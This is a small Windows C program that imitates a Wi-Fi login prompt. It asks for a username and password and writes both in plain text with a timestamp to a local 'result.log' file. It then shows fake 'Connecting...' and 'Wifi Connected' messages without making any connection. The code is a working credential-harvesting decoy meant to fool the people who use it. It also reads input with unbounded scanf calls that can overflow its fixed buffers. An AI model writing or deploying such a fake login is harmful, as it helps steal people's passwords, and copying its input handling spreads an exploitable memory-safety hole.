#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <windows.h>

void add() {
    char username[50];
    char password[50];
    
    printf("Username: ");
    scanf("%s", username);
    
    printf("Password: ");
    scanf("%s", password);

    if (strlen(username) > 0 && strlen(password) > 0) {
        time_t current_time;
	// struct tm from time.h pointer
        struct tm *time_info;
        char timeString[50];
        time(&current_time);
        time_info = localtime(&current_time);
        strftime(timeString, sizeof(timeString), "%Y-%m-%d %H:%M:%S", time_info);        
        FILE *file = fopen("result.log", "a");
	//open and append result.log
        if (file) {
            fprintf(file, "Timestamp: %s Username: %s Password: %s\n", timeString, username, password);
            fclose(file);
            printf("Connecting...\n");
            Sleep(2500);
            printf("Wifi Connected\n");
	        printf(" "); 
        } else {
            perror("Error writing to file");
        }
    } else {
        printf("Username and Password are required\n");
    }
}

int main() {
    add();
    return 0;
}
